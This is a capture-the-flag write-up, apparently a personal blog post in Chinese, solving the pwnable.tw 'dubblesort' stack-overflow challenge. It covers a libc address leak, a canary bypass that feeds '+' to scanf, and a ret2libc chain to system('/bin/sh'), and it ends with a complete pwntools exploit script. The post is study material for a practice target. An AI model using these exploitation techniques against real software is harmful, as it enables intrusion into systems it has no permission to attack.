---
title: Libc-Leak-and-Bypass-the-canary-dobblesort-[pwnable]
date: 2022-4-25
tags: 
- Pwn
- CTF

categories:
- CTF

toc: true # 是否启用内容索引
sidebar: none # 是否启用sidebar侧边栏，none：不启用
---





# Libc leak and Bypass the canary-pwnable[dobblesort]

## 0x1 checksec

![checksec](2022-4-25-dobblesort/图像 1.png)

Full protection.

## 0x2 Analysis

查看这个程序，

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  unsigned int *v4; // edi
  unsigned int i; // esi
  unsigned int j; // esi
  int result; // eax
  unsigned int v8; // [esp+18h] [ebp-74h] BYREF
  unsigned int v9[8]; // [esp+1Ch] [ebp-70h] BYREF
  char buf[64]; // [esp+3Ch] [ebp-50h] BYREF
  unsigned int v11; // [esp+7Ch] [ebp-10h]

  v11 = __readgsdword(0x14u);
  sub_8B5();
  __printf_chk(1, "What your name :");
  read(0, buf, 0x40u);
  __printf_chk(1, "Hello %s,How many numbers do you what to sort :");
  __isoc99_scanf("%u", &v8);
  v3 = v8;
  if ( v8 )
  {
    v4 = v9;
    for ( i = 0; i < v8; ++i )
    {
      __printf_chk(1, "Enter the %d number : ");
      fflush(stdout);
      __isoc99_scanf("%u", v4);
      v3 = v8;
      ++v4;
    }
  }
  sort(v9, v3);
  puts("Result :");
  if ( v8 )
  {
    for ( j = 0; j < v8; ++j )
      __printf_chk(1, "%u ");
  }
  result = 0;
  if ( __readgsdword(0x14u) != v11 )
    sub_BA0();
  return result;
}
```

对于这个反汇编的程序，可以看到漏洞点在于对于排序的个数没有限制，可以作为栈溢出的漏洞点

同时，因为开了NX，RELRO，ret2shellcode无法作用，但是给了libc版本，考虑ret2libc.

进一步的，通过调试，发现栈上存在libc的地址，考虑通过read和printf实现泄露

## 0x3 Process

1. 读入cyclic，一直覆盖到libc基址的位置，再通过__printf_chuk泄露出libc基址
2. 读入需要排序的数字，在canary之前的数字选择较小的数字。保证排序之后canary仍然在原来的位置
3. 在读入到cannary的位置时，送入+号，实现读入但不写入内存，就实现了对canary的绕过
4. 在栈上布置libc中system以及/bin/sh的地址

## 0x4 Some questions

1. 在实际调试过程，通过pwndbg的canary命令查看发现, 在这个题目中，canary并不在靠近rbp的位置，反而在栈中间

2. 一个问题，题目给的libc不是标准命名，所以我找不到对应ld，询问学长后知道了直接在libc文件中找标准命名，虽然我找到的这个版本的libc和他给的还是不一样。。。。

3. 在本地打通后，远程一直打不通，在将泄露出的基址打印出来之后，发现这个地址最后的三位地址是0x244，而不是本地的0x000，在本地，这个地址是偏移为0x1b0000的地址，但是在远程，这个偏移显然改变了

   解决：

   - 多次连接远程，对于泄露出来的地址进行分析，发现地址其他部分都在变化，低位的0x244始终不变，符合libc地址的特征，推测远程的这个位置确实是一个libc的地址。
   - 那么偏移到底是多少呢？这个地址大概率是一个特殊地址，直接将libc拖入IDA，搜索结尾为0x244的地址，尝试可能地址，尝试了几次后成功，为偏移在0x1AE244的一个Initialization Table的地址

   思考：

   - 对于这个题目，我本地和远程libc地址是相同的，但是唯一不同的只有ld版本，但是ld版本的不同也不应该改变栈中的这个地址的偏移, 所以这里的变化我还没搞明白原因。暂时码着
     以及，我查看往年的wp，所有的都是直接0x1b0000的偏移实现getshell。是远程改了题目吗?

## 0x5 exp

```python
from pwn import*

#p = gdb.debug('./dubblesort','b main')
#p = process('./dubblesort')
p = remote('chall.pwnable.tw',10101)
context.terminal = ['tmux','splitw','-h']
context.log_level = 'debug'
#elf = ELF('/home/nemo/Active/CTFtools/glibc-all-in-one/libs/2.23-0ubuntu5_i386/libc-2.23.so')
ret_add = 0x177dc

elf = ELF('./libc_32.so.6')

def putNum(i):
    p.recvuntil(' : ')
    p.sendline(str(i))


name = cyclic(27)

p.recvuntil('name :')
p.sendline(name)

libc_base = u32(p.recv(32+6)[-4:])
print('%x' % libc_base)
libc_base = (((libc_base>>12)-0x1Ae)<<12)

print('%x' % libc_base)
system_add = libc_base + elf.sym['system']

p.recvuntil('sort :')
p.sendline('36')

for i in range(24):
    putNum(0)

p.recv()
p.sendline('+')

for i in range(8):
    putNum(system_add)
for i in range(3):
    putNum(libc_base+elf.search(b'/bin/sh\0').__next__())

p.interactive()
```

## 0x6 New skills

**PWN**

1. +-号绕过canary
2. 泄露栈上的libc地址
3. debug对于远程的分析

**Script**

1. python格式化输出
2. pwntools.elf模块搜索字符串。
   python3的next()改名了
